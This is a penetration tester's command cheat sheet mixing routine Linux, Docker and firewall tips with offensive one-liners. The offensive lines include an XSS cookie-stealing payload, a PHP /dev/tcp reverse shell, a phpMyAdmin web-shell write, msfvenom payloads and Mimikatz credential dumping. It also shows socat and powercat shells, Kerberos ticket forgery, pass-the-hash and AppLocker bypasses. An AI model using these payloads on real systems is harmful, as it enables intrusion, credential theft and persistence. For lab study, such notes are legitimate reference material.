# Command-Center

**Frequently used commands that are searchable with your browser's search function. (CTRL+f on Firefox)**

- Go here if you are looking for:
- **[TOR Service / Anonymity](sections/Tor_Service_Anonymity.md)**
- **[Linux Privilege Escalation (privesc)](sections/Linux_Privilege_Escalation.md)**
- **[Windows Privilege Escalation (privesc)](sections/Windows_Privilege_Escalation_.md)**
- **[Windows Active Directory](sections/Windows_Active_Directory.md)**
- **[Windows SSH Service Setup](sections/Windows_SSH_Service_Setup.md)**
- **[Pivoting in Metasploit](sections/Pivoting_in_Metasploit.md)**
- **[Buffer Overflow (Windows, Basic)](sections/Buffer_Overflow_Windows.md)**
- **[GPG](sections/GPG.md)**
- **[WiFi](sections/wifi.md)**
- **[Python3 one liners and scripts](sections/Python_One_Liners_and_scripts.md)**

![002_available_commands](/images/002_available_commands.png)

## Adding and removing users on Linux (including home dir) and adding user to the sudoers group

- to add a user: `sudo adduser <userename>`
- add the created user to the sudoers group: `sudo usermod -aG sudo <username>`
- remove a user (incl. deleting home dir): `sudo deluser --remove-home <username>`
- if the above doesn't work you can also try: `sudo deluser --remove-all-files <username>`

## AllwaysInstallElevated / Windows

- this part was also added to the Windows privesc section
- check for it:
    - `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
    - `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
    - execute .msi payload: `msiexec /i "C:\xampp\htdocs\shenzi\notavirus.msi"`

## Ansible
The coma after 'localhost' or target IP is needed. Also in playbook: `Hosts: all` and connection is not specified that's why the `--connection=local` is needed for running the playbook on a localhost.
- running it locally: `ansible-playbook deploy.xml -K -i localhost, --connection=local`
- running it remotely: `ansible-playbook deploy.xml -k -K -i <target IP>,`
## Amass

Really good if you need to enumerate subdomains, just make sure you start it at night before going to bed :)

- `amass -ip -d <domain.com>`
- If you don't have ***amass*** installed on your system:
    - `apt install snapd`
    - `service snapd start`
    - `snap install amass`
    - `snap run amass`

## awk

- extracting the first and third field `echo "hello::there::friend" | awk -F "::" '{print $1, $3}'`

## bash

- ping scan

```
#!/bin/bash

for ip in `seq 1 10`;do
ping -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &
done

```

- port scan

```
#!/bin/bash

host=10.5.5.13
for port in {1...65535}; do
	timeout .1 bash -c "echo >/dev/tcp/$host/$port" &&
		echo "port $port is open"
done
echo "Done"

```

## Binwalk

Extracts files hidden in pictures, pretty good for steganography.

- `binwalk somepicture.jpg -e`

## Bloodhound - AD

- `bloodhound-python -u <username> -p <password> -d domain.local -c all`
- `bloodhound-python -u svc_mssql -p <password> -d example.local -c all -gc example.local -ns <nameserver IP>`

## Burp Suite

- finding subdomains in "target"
- `.*\.?example\.com$`

## bypass AppLocker in Windows

There are many ways to bypass AppLocker rules, if it's configured with the default rules, we can bypass it just by placing our executable into this directory which is whitelisted by default:

- `c:\Windows\System32\spool\drivers\color`

## certbot

- list certificates: `certbot certificates`
- register certificate: `certbot certonly --cert-name exaple.com -d example.com`
- register certificate without email: `certbot certonly --register-unsafely-without-email`
- renew certificate: `certbot renew`

## change-login screen Ubuntu 20.04 LTS

- `wget https://github.com/PRATAP-KUMAR/ubuntu-gdm-set-background/archive/main.tar.gz`
- Then run: `sudo ./ubuntu-gdm-set-background --image ~/Downloads/mywallpapaer.jpg`

## checking temperature on CPU

- save code as `<file name>.c` and compile it with `gcc <filename.c> -o <filename>`

```
#include <stdio.h>

int main(int argc, char *argv[])
{
   FILE *fp;

   int temp = 0;
   fp = fopen("/sys/class/thermal/thermal_zone0/temp", "r");
   fscanf(fp, "%d", &temp);
   printf(">> CPU Temp: %.2f°C\n", temp / 1000.0);
   fclose(fp);

   return 0;
}

```

## chisel

- `chisel server --socks5 -p 8000 --reverse`
- `chisel client <chisel server IP>:<PORT> R:socks`
- don't forget to add it to your proxychains4.conf file:
    - `socks5 127.0.0.1 1080`
- `./chisel client --fingerprint <chisel server fingerprint> <attacker IP>:8080 0.0.0.0:9999:<attacker IP>:9999` this command is running on the pivot box, in the commands the `0.0.0.0:9999` is for the pivot box so it's listening on all interfaces on port 9999 and when receives a connection it forwards it back to the attacker's machine. The payload is generated so the callback will be to the pivot box.

## Cleaning up

- `sudo apt autoremove && sudo apt autoclean`
- `sudo du -xh --max-depth=1 /var`
- `sudo du -xh --max-depth=1 /var/log`

## blocked cmd bypass

- create a batch file and run it with: `rundll32.exe shell32.dll,ShellExec_RunDLL c:\users\<username>\desktop\command.bat`
- output for the command will be written in output.txt
- can tweak it to your liking, including cmd= and enter
- great resource **[here](https://lolbas-project.github.io/lolbas/Libraries/Shell32/)**

```
@echo off
:Loop
echo %cd%^>
set /p cmd=Type your command here
%cmd% >> c:\users\<username>\desktop\output.txt
Goto Loop

```

- another stealthier example

```
@echo off

set cmd=dir
%cmd% >> c:\users\<username>\desktop\output.txt

```

## cookie stealing

- `<script>new Image().src="http://<python3 http server running in kali IP>:<PORT>/cool.jpg?output="+document.cookie;</script>`

## crackmapexec

- `crackmapexec -t 20 smb --shares <target> -u '' -p '' -d <FQDN>`
- `crackmapexec winrm <target IP> -u users -H hashes`
- `crackmapexec smb -u '' -p '' -d <domain> ./smb-hosts.txt --pass-policy`

## curl

You can do some great things with ***curl***, it's worth going through it's man page, this is one of the great techniques I use quite often:

- `curl -s <domain or IP> | grep "<form"` to discover which HTTP methods are available. `s` is for *silent* mode.
- `curl -X DELETE <http://IP:PORT>` if you get a 200 OK that means that method is supported, you can try all the others as well like PUT, etc..
- generating QR code of a website: `curl qrenco.de/https://google.com`

## Digitalocean
Use anchor IP to have your Reserved IP when `curl ifconfig.me`
1. Find anchor IP `curl -s http://169.254.169.254/metadata/v1/interfaces/public/0/anchor_ipv4/gateway`
2. Temporal solution for testing if it works: `sudo sh -c "ip route del 0/0; ip route add default via <anchor-gateway-IP-address>"` and `curl ifconfig.me`
3. Permanent solution (persistent): `nano /etc/network/interfaces`
```
auto eth0
iface eth0 inet static
        address 203.0.113.0
        netmask 255.255.252.0
        gateway 162.243.184.1
        up ip addr add use_your_anchor_ip/16 dev eth0 #use your anchor IP address
        dns-nameservers 8.8.8.8 8.8.4.4 
```
* `sudo reboot`

## dirb

- when username and password is known: `dirb <http://IP or domain/> -u <username>:<password>`

## dirsearch

- `dirsearch.py -u <http://IP or domain> -e php, html -x 400, 401, 403` the `x` is to exclude those type of error response codes.

## dir (Win)

Searching in ***Windows*** using the `dir` command we have the following switches available: (credit: find the original post by **computerhope.com** [here](https://www.computerhope.com/dirhlp.htm))

- `dir *.txt *.doc` to list any file whose name has the file extension *.txt* or *.doc*
- `dir /a:d` to list only directories
- `dir /a:r` to list only files with the read-only attribute
- `dir /s` to list files and directories in the directory, and in any subdirectories. For instance, if your current directory is the root directory "C:>," this command lists every file and directory on the C: drive
- `dir /p` to pause after each screenful of output. Use this option if the information is scrolling past the screen before you can read it. You are prompted to press any key before listing continues past the current screen
- `dir /w` to list multiple file names on every line, producing "wide" output, which displays more file names at once. However, other information such as file size is omitted
- `dir /s /w /p` to recursively lists all files and directories in the current directory and any subdirectories, in wide format, pausing after each screen of output recursively lists all files and directories in the current directory and any subdirectories, in wide format, pausing after each screen of output
- `dir /s /w /p "C:\Program Files"` same as the above command, but lists everything in **C:\Program Files**, instead of the current directory. Because the directory name contains a space, it is enclosed in double-quotes, to prevent it from being interpreted is as two separate options
- `dir /s /q /a:sh /p C:\Windows` Lists any files and directories in **C:\Windows**, and any of its subdirectories `/s`, which have both the "hidden" and "system" file attributes `/a:sh`. Also, lists the owner of the file `/q`, and pauses after each screen of output `/p`
- `dir \ /s | find "i" | more` the above command uses vertical bars to pipe the output from `dir` to the command `find`, and then to the command `more`. The result is a list of all files and directories in the root directory of the current drive (), with extra information. Namely, find also displays the number of files in each directory, and the amount of space occupied by each
- `dir /s /a:hs /q C:\Windows > myfile.txt` runs the *`dir`* command, but redirects the output to the file **myfile.txt**, instead of displaying it on the screen. To view the contents of the file, you can use the `type` command and your file name, if the file is very long try it with `type myfile.txt | more`

## DNS

- `dig axfr ms01.thinc.local @10.1.1.113`
- `host www.example.com`
- `host -t mx example.com`
- build possible hostnames to list.txt then `for ip in $(cat list.txt);do host $ip.example.com;done` can use seclists as well web-discovery DNS list
- reverse lookup brute force: `for ip in $(seq 50 100);do host 38.100.193.$ip;done | grep -v "not found"`
- Zone transfer: `host -l example.com ns1.example.com`
- finding nameservers: `host -t ns example.com | cut -d " " -f 4`
- with script:

```
#!/bin/bash

#Simple Zone Transfer Bash Script
#$1 is the first argument given after the bash script
#Check if argument was given, if not, print usage

if [ -z "$1" ]; then
	echo "[*] Simple Zone Transfer Script"
	echo "[*] Usage: $0 <domain name>"
	exit 0
fi

# if argument was given, identify the DNS servers for the domain

for server in $(host -t ns $1 | cut -d " " -f4);do
	host -l $1 $server | grep "has address"
done

```
## dnschef (use it with setoolkit from Kali)

* `dnschef --fakeip=192.168.1.102 --fakedomains=<domain name you want to pretend to be> --interface=192.168.1.102`
* use setoolkit to serve to cloned site

## Docker

- test if it's working: `docker run hello-world`
- `docker run --help` - to list all flags this command supports
- `docker search <TERM>` - to search for a Docker container
- `docker pull busybox` - to pull down busybox
- `docker run -it busybox` - to run busybox, the `it` attaches us to an interactive container
- `docker ps -a` - to check running docker containers and their ID
- `docker exec -it <container ID> /bin/bash` - to enter a Docker container
- `docker rm <container ID>` - to remove a docker container
- `docker rm $(docker ps -a -q -f status=exited)` - if you have a bunch of containers to delete in one go, copy-pasting IDs can be tedious. In that case, you can simply run this command. The `q` flag returns only the numeric IDs and the `f` filters output based on conditions provided.
- `docker container prune` - in later versions of Docker, this command can be used to remove all stopped containers
- `docker container ls` - lists all containers
- `docker image list` - list all pulled images
- `docker rmi <image ID>` - from the above command get image ID and this command will delete the pulled image
- `docker network ls` - lists Docker images running on network
- see below, create a folder for the docker container then create a `docker-compose.yaml` with:

```
---
services:
  homeassistant:
    container_name: homeassistant
    image: "ghcr.io/home-assistant/home-assistant:2023.6"
    volumes:
      - ./config:/config
      #- /etc/localtime:/etc/localtime:ro
    # devices:
    #   - /dev/ttyACMO  # (optional) Add serial devices to the container
    privileged: true
    restart: unless-stopped

```

- run `docker compose up` from this folder. If it fails run `docker run -d -p 8123:8123 --privileged --volume "/opt/homeassistant:/config" --name homeassistant --restart unless-stopped` automatically restart container on boot up

## Docker & Juice Shop

This is how you install ***Docker*** on Kali for whatever you need, I run my Juice Shop app to test for the OWASP Top10 on Docker:

1. `curl -fsSL https://download.docker.com/linux/debian/gpg | gpg --dearmor | sudo tee /usr/share/keyrings/docker-archive-keyring.gpg > /dev/null`
2. `echo 'deb [arch-amd64 signed-by-/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/debian buster stable' | sudo tee /etc/apt/sources.list.d/docker.list`
3. `apt update`
4. `apt install docker-ce`
5. `docker --version`

To install **Juice Shop**

1. `docker pull bkimminich/juice-shop`
2. `docker run --rm -p 3000:3000 bkimminich/juice-shop`
3. browse to `http://localhost:3000` (on macOS and Win browse to `http://192.168.99.100:3000` if you are using docker-machine instead of the native docker installation)

Once you installed **Juice Shop** and want to run it on different occasions there's this simple bash script to help you with. Just make a file with nano, name it as **run_juice_shop.sh** or whatever you want to name it copy/paste the below code in it, save it and make it executable with `chmod +x run_juice_shop.sh`:

```
#!/bin/bash

sudo docker run --rm -p 3000:3000 bkimminich/juice-shop

```

## docker-compose
* `docker-compose up -d`

```
version: "3"
networks:
  hacked:
    ipam:
      driver: default
      config: 
        - subnet: "192.168.45.0/24"
services:
  kali:
    image: kalilinux/kali-rolling:latest
    networks:
      hacked:
        ipv4_address: 192.168.45.10
    tty: true
  redis:
    image: redis:5.0.9-alpine
    networks:
      hacked:
        ipv4_address: 192.168.45.50
```

## Extract IPs from a text file

- `grep -o ‘[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}’ nmapfile.txt`

## gcc

- install the cross-architecture C header files with the following command:
- `sudo apt-get install gcc-multilib -y`

## gpg2john

Passing a private key to ***gpg2john*** to prep it and then passing the output file to john to crack it :) once it's done you can use the crack password and the private key to try to log in to the target system via SSH with `ssh -i id_rsa <username>@<IP>`

- `gpg2john id_rsa > id_rsa_prepped_for_john.hash` prepping the private key for a format understandable by john
- `john --wordlist=rockyou.txt --format=gpg id_rsa_prepped_for_john.hash`

## hashcat

Basic syntax. Again this is not a tutorial page, just a quick look up on the different and mostly used switches until you learn it by muscle memory. The *mode number* can be found **[here](https://hashcat.net/wiki/doku.php?id=example_hashes)**

- `hashcat --force -m <mode number> -a 0 crackthis.txt /usr/share/wordlist/rockyou.txt`
- to find the *hashcat potfile*: `cat ~/.hashcat/hashcat.potfile`

## how to change the color for the current user in bash terminal (Ubuntu)

- Open the file: `gedit ~/.bashrc`.
- Look for the line with `#force_color_prompt=yes` and uncomment (delete the #).
- Look for the line below `if [ "$color_prompt" = yes ];` then that should looks like: `PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '`
- Pay attention at the part `\u@\h` it is saying `"user@host"` and the number before it `\[\033[01;32m\]` indicates the color. This is what you have to change. For example, lets change the user to purple, the `"@"` to black and host to green. Edit the line so it looks like: `PS1='${debian_chroot:+($debian_chroot)}\[\033[01;35m\]\u\[\033[01;30m\]@\[\033[01;32m\]\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '`
- The colors to the numbers are:

```
Black       0;30     Dark Gray     1;30
Blue        0;34     Light Blue    1;34
Green       0;32     Light Green   1;32
Cyan        0;36     Light Cyan    1;36
Red         0;31     Light Red     1;31
Purple      0;35     Light Purple  1;35
Brown       0;33     Yellow        1;33
Light Gray  0;37     White         1;37

```

## hydra

I mainly created this part because of the web login attack part. Sometimes it's hard to remember the syntax.

- `hydra -l <user name> -P <full path to the password list> ssh://<IP>` using Hydra against SSH
- `hydra -l <username> -P <full path to the password list> ftp://<IP>` using Hydra against
- `hydra -L <username list> -p <password> <IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30` you can capture the error message (Invalid username) by trying a credential on the target website and replace the one I have in this syntax if needed. This example tests several usernames for the same password, a technique also called password spraying.

## Impacket

- if got ntds.dit and SYSTEM files (SeBackupPrivilege) then use secretsdump: `secretsdump.py -ntds ./ntds.dit -system ./SYSTEM LOCAL`
- ASREPROASTING: `GetNPUsers.py spookysec.local/svc-admin -no-pass -format hashcat -dc-ip 10.10.159.22 -k | tee asrep-result.txt` and for cracking the hashes: `hashcat -m 18200 --wordlist /usr/share/wordlists/rockyou.txt -O --show`

## psexec

- `psexec.py <username>:'<password>'@<IP>`

## Install Python3 on Ubuntu

- `sudo apt install python3 python3-pip build-essential python3-dev`

## ip add

- `route` and `ip route add 192.168.222.0/24 via 10.175.34.1`

## iptables

- This example shows **how to block all connections** from the IP address 10.10.10.10. `This example shows how to block all connections from the IP address 10.10.10.10.`
- This example shows how to block all of the IP addresses in the 10.10.10.0/24 network range. You can use a netmask or standard slash notation to specify the range of IP addresses. `iptables -A INPUT -s 10.10.10.0/24 -j DROP` or `iptables -A INPUT -s 10.10.10.0/255.255.255.0 -j DROP`
- **Connections to a specific port:** This example shows how to block SSH connections from 10.10.10.10. `iptables -A INPUT -p tcp --dport ssh -s 10.10.10.10 -j DROP`
- This example shows how to block SSH connections from any IP address. `iptables -A INPUT -p tcp --dport ssh -j DROP`
- **Connection States:** the capability you’d need to allow two way communication but only allow one way connections to be established. Take a look at this example, where SSH connections FROM 10.10.10.10 are permitted, but SSH connections TO 10.10.10.10 are not. However, the system is permitted to send back information over SSH as long as the session has already been established, which makes SSH communication possible between these two hosts.
    - `iptables -A INPUT -p tcp --dport ssh -s 10.10.10.10 -m state --state NEW,ESTABLISHED -j ACCEPT`
    - `iptables -A OUTPUT -p tcp --sport 22 -d 10.10.10.10 -m state --state ESTABLISHED -j ACCEPT`
- **Saving Changes:** The changes that you make to your iptables rules will be scrapped the next time that the iptables service gets restarted unless you execute a command to save the changes. This command can differ depending on your distribution: `sudo /sbin/iptables-save`
- Drop all incoming traffic from any source IP address except from 192.168.12.12 `iptables -A INPUT -s ! 192.168.12.12 -j DROP`
- To delete a rule that allows incoming traffic from the IP address 192.168.12.13 `iptables -D INPUT -s 192.168.12.13 -j ACCEPT`
- iptables set default policy `iptables -P INPUT DROP`
- To save rules to a file at /etc/iptables/rules.v4 `iptables-save > /path/to/file`
- To restore rules run `iptables-restore < /path/to/file`
- To redirect traffic from an incoming connection to 192.168.9.12 on port 51666/tcp to a NAT 10.10.10.10  on port 51666/tcp: `iptables -t nat -A PREROUTING -p tcp --dport 51666 -j DNAT --to-destination 10.10.10.10:51666`
- to list chains with line numbers: `iptables -L INPUT --line-numbers`
- to delete a rule by it's number: `iptables -D INPUT 3`
- to edit a rule by it's number: `iptables -R INPUT 6 <type out the new rule here>` `

### IPtables example:
* `sudo apt install iptables-persistent`
* `sudo netfilter-persistent save` - to save the created rules
```
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A OUTPUT -o lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate INVALID -j DROP
sudo iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
sudo iptables -A OUTPUT -p tcp --sport 22 -m conntrack --ctstate ESTABLISHED -j ACCEPT
sudo iptables -A INPUT -p tcp -s <IP or subnet where you want to connect from> -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 1337 -j ACCETP # leaving port 1337 open for rev shell, no service is running on it until you start nc or something else
sudo iptables -P INPUT DROP
```
* `sudo iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT` - use this only if you want to allow internal network (eth1) to be able to access external (eth0)
* If your firewall OUTPUT policy is not set to ACCEPT, and you want to allow outgoing SSH connections—your server initiating an SSH connection to another server—you can run these commands: `sudo iptables -A OUTPUT -p tcp --dport 22 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT` and `sudo iptables -A INPUT -p tcp --sport 22 -m conntrack --ctstate ESTABLISHED -j ACCEPT`

## John

Cracking some SHA256 hashes with john, using the rockyou.txt as a wordlist, redirecting the output into athe johncracked.txt

- `john <hashes.txt> --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 > johncracked.txt`

## LDAP enumeration

- ldapsearch (can also add -v for verbosity): `ldapsearch -x -H ldap://192.168.111.121 -D '' -w '' -b "DC=hank,DC=offs"`
- ldapsearch (when password is known): `ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w <PASSWORD HERE> -b "DC=hutch,DC=offsec" -H ldap://192.168.111.109 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`

## metasploit

- port forward: `portfwd add -L 0.0.0.0 -l 8888 -p 8080 -r 127.0.0.1`
- database "msf" collation version mismatch:
```
\l
sudo -u postgres psql
ALTER DATABASE msf REFRESH COLLATION VERSION;
ALTER DATABASE postgres REFRESH COLLATION VERSION;
\q
```

## mingw

* `apt install mingw-w64`
* This command works for C files on x86 64-bit architecture. The "-o" determines the name of the compiled binary: `x86_64-w64-mingw32-gcc shell.c -o shell.exe`
* If we were compiling for 32 bit, we would use a command that looks like this: `i686-w64-mingw32-gcc shell.c -o shell.exe`
* checking all the different versions: `apt-cache search mingw-w64`
* [reference](https://null-byte.wonderhowto.com/how-to/use-mingw-compile-windows-exploits-kali-linux-0179461/)

## mount

- `mount -t nsf Mtarget IP>:/home/username /mnt/folder -nolock`

## msfvenom

- Windows add user: `msfvenom -p windows/adduser USER=hacker PASS=Password123! -f exe -o hackware.exe`
- add user to the local administrator group: `msfvenom -p windows/x64/exec CMD="net localgroup Administrators <username> /add" -f exe -o mysqld.exe`
- into an existing file: `msfvenom -p windows/shell_reverse_tcp LHOST=<kali IP> LPORT=<kali PORT> -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe`

## mysql

- start on Windows: `set path=%PATH%;D:\xampp\mysql\bin;` then: `mysql -u root -p`

## netsh / Windows

- **port forwarding:** Remember to add a firewall rule, +IP Helper from Services must be enabled and Ethernet properties, Internet Protocol Version 6 -> ON `netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110`
- **netsh add firewall rule:** `netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow`
- **find listening port:** `netstat -anp TCP | find "4455"`

## nmap

If you need to generate a nice html report from the output you can use *xsltproc*:

- `sudo xsltproc final_discovery.xml -o nmap_DATE_TARGET.html`

## overpass-the-hash

- get the bill_admin's hash then use it to open up a new PowerShell prompt as him with mimikatz: `sekurlsa::path /user:bill_admin /domain:corp.com /ntlm:<NTLM hash> /run:PowerShell.exe`

## pass-the-hash

- pass-the-hash attack for Win: `pth-winexe -U Administrator%'<admin hash>' //<target IP> cmd.exe`

## Persistence via RDP

(credit: [Joe Helle aka The Mayor, MPP course](https://academy.tcm-sec.com/p/movement-pivoting-and-persistence-for-pentesters-and-ethical-hackers))

1. `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"` enabling Remote Desktop via PowerShell
2. `xfreerdp /u:<username> /p:'<password>' /v:<target IP>` now we can connect to it from kali
3. To disable it: `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"`

## phpmyadmin

- `select ("<?php system($_REQUEST['cmd'])?>") INTO DUMPFILE C:\\wamp\\apps\\phpmyadmin5.0.2\\cmd.php`

## php web server

- `php -S 0.0.0.0:8000`

## php wrapper

- `http://<target IP>/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>`
- `<?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 2>&196"); ?>`

## Pihole ( and Unbound)

- For easy install and setup follow the steps in this blog post at **[Crosstalk Soutions](https://www.crosstalksolutions.com/the-worlds-greatest-pi-hole-and-unbound-tutorial-2023/)**
- once installed and configured changing wi-fi adapter DNS settings from cmd: `netsh interface ip set dns name="Wi-Fi" static <DNS Server static IP>`

## playing with encoding and hashes

If you are interested in more depth on this matter check out the cyberchef's website.

- `echo -n 'hashes are cool | md5sum`
- `echo -n 'hashes are cool' | base64` encoding with base64
- `echo -n 'aGFzaGVzIGFyZSBjb29s' | base64 -d` decoding with base64
- `echo -n 'hashes are cool' | rot13` encoding and decoding is the same syntax

## PowerCat

- file transfer:
    - on target: `powercat -c 10.11.0.4 -p 443 -i C:\Users\user\powercat.ps1`
    - on kali: `nc -lnvp 443 > receiving_powercat.ps1`
- reverse shell:
    - `powercat -c 192.168.115.111 -p 1234 -e cmd.exe` or `powercat -c 192.168.115.111 -g > reverseshell.ps1` and `revereshell.ps1` on kali of course: `nc -lnvp 1234`
- bind shell:
    - encoded bind shell: `powercat -l -p 443 -e cmd.exe -ge > encoded_bindshell.ps1`
    - on kali: `nc -nv <targetg IP> 443`
- port forward:
    - `powercat -l -p 9090 -r tcp:<kali IP>:<kali PORT> -v`
- port scan:
    - on target: `(21,22,80,443) | % {powercat -c <target IP> -p $_ -t 1 -Verbose -d}`

## PowerShell

- downloadstring: `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')`
- after download: `Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" lsadump::sam" "exit"'`
- the above command invocation can be executed directly by putting it as the last line in the Invoke-Mimikatz.ps1 script

## public IP from terminal

- `dig +short myip.opendns.com @resolver1.opendns.com`
- `curl ifconfig.me` a simpler way is just visiting ifconfig.me with curl :)

## quickly append IP to your /etc/hosts file

- `sudo echo '<192.168.0.23> <retrowerb.htb>' | tee -a /etc/hosts`

## Raspberry Pi - Raspbian

- if after a fresh OS install, your created user can run sudo commands or switch to the root user without a password prompt, change the `<username> ALL=(ALL) NOPASSWD: ALL` to `<usernmae> ALL=(ALL) ALL` in the /etc/sudoers.d/010_pi-nopasswd file. Switch to the root user and edit the file with: `visudo /etc/sudoers.d/010_pi-nopasswd`

## Rasbperry Pi - Pivpn (OpenVPN)

- Changing the public IP/DNS: `sudo nano /etc/openvpn/easy-rsa/pki/Default.txt` and your .ovpn files if you have already generated them.

## Raspberry Pi - install and config user for xrdp

* `sudo apt update`
* `sudo apt install xrdp`
* `sudo systemctl start xrdp`
* `sudo systemctl enable xrdp`
* `sudo systemctl status xrdp`
* `sudo usermod -a -G ssl-cert <username>`

## RDP

- (rdesktop) with local file share:
    - `rdesktop -u <username> -d <domain> -p <password> -r disk:local="/home/kali/Desktop/fileshare" <host IP>:<PORT>`
- cracking RDP password (ncrack):
    - `ncrack -vv --user <USERNAME> -P /usr/share/wordlists/rockyou.txt`

## Restricted traffic bypass
- `curl -X POST -H 'X-Forwarded-For: <PIVOT IP>' --data 'data=id' http://<TARGET IP>/cmd.php>`

## RPC (enum)

- `rpcclient -N -u "" ms01.htb.local`
- `rpclient -N -U "" <target IP>`
    - `enumdomusers`
    - `enumdomgroups`
    - `queryuser <USERNAME>`
- `rpcclient -W '' -c querydispinfo -U"%"<target IP>"`
- can also use rpcdump.py

## sed

- `sed -i 's/text_to_replace/new_text/g' <file name>` without the `g` parameter at the end sed will only replace the first instance on each line only and without the `i` switch sed will no overwrite the file we are working with, if we want to save the results as a new file we can just redirect the output to a new file like so: `sed -i 's/test_to_replace/new_text/g' <original file> > <new file>`
- `sed -n 's/text_to_replace/new_text/pg'` sed `-n` means no output unless there is a match because of the `p` parameter

## SET (social engineering toolkit / Kali)
- need to start setoolkit first: `sudo setoolkit` then choose "yes".
- change port from 80 in config file so to avoid conflict with gophish:
    - `sudo nano /et/setoolkit/set.config`

## Silver Ticket and Golden Ticket

- **Silver Ticket attack**
- needed:
- Domain security identifier (SID)
- Domain fully qualified domain name (FQDN)
- Service account's password hash
- Username to impersonate
- Service name
- Target
- `whoami /user`
- get SID
- `systeminfo | findstr /B /C:"Domain"`
- get FQDN
- `setspn -L <service account name>`
- get service, ex.: HTTP/worktation-02.krbtown.local
- service is HTTP
- creating the ticket with Mimikatz:
- `kerberos::golden /sid:<SID (remove last 4 digits after dash)> /domain:<Domain FQDN> /user:<user to impersonate (need user's hash too at the end)> /service:<service we are trying to connect to, in our example is HTTP> /target:<The target server (workstation-02.krbtown.local)> /rc4:<the password hash of the service account in our case Administrator>`
- Mimikatz will save the output as ticket.kirbi
- using Rubeus to load the ticket into our current session:
- `Rubeus.exe ptt /ticket:ticket.kirbi`
- now we can connect to the iis_service from this session
- **Golden Ticket attack**
- needed:
- Domain SID
- Domain FQDN
- KRBTGT's password hash
- Username to impersonate
- `whoami /user`
- `systeminfo | findstr /B /C:"Domain"`
- The KRBTGT's password hash can only be dumped after becoming domain administrator and either performing a password dump on the DC, a DCSync attack or a shadow copy on the DC. The user to impersonate can be any user of the domain even a non existing one with administrator RID.
- `kerberos::golden /sid:<Domain SID> /domain:<Domain FQDN> /user:<The user to impersonate> /krbtgt:<The password hash of the KRBTGT account>`
- load the created ticket into memory and then use psexec to get a shell on the target machine
- `Rubeus.exe ptt /ticket:ticket.kirbi`
- `PsExec.exe \\dc01.krbtown.local cmd`

## socat

- `socat -d -d TCP-LISTEN:1234 -`
- `socat -d -d TCP-CONNECT:127.0.0.1:1234 -`
- **as a redirector:** `socat TCP-LISTEN:80,fork,reuseaddr TCP:<IP>:<PORT>`
- **transferring files:**
    - `socat -d -d TCP-LISTEN:1234 OPEN:filetransfer.txt,create`
    - `socat -d -d TCP-CONNECT:127.0.0.1:1234 FILE:/etc/passwd`
- **listener for reverse shell:** `socat -d -d TCP-LISTEN:443 STDOUT`
- **executing commands on Win:**
    - `socat -d -d TCP-LISTEN:1234 EXEC:'cmd.exe',pipes`
- **executing cmd exe from Win to connect back to kali:**
    - `socat TCP4:192.168.119.198:443 EXE:`
- **encrypted reverse shell:** `socat -d -d OPENSSL-LITEN:5557,cert=bind)shell.pem,verify=0,fork STDOUT`
- **connecting back with encryption from Windows:** `socat OPENSSL:192.168.119.198:5556,verify=0 EXEC:'cmd.exe',pipes`
- **if victim was a Linux machine this is the syntax:** `socat OPENSSL:192.168.168.1:4443,verify=0 EXEC:/bin/bash`
- you also have to generate a certificate first, see more details **[here](https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/)** (check that link out, it's a great blog post)
- For generating the cert here is a quick description from the source link above: "We will use OpenSSL encryption for this which is very easy to accomplish. We start by generating a key and a certificate using the following command:

`openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US' -out bind.crt`

This will create the key file named `bind.key` and the certificate file named `bind.crt`. In order to be able to use them we just need to convert them to a .pem file which is super easy as we simply have to concatenate them using the following command.

`cat bind.key bind.crt L > bind.pem"`

## SSH and Plink

- from rev shell with plink: `cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.10.10.12:1234:127.0.0.1:3306 10.10.10.12`
- from RDP session: `plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`

## sql (command execution)

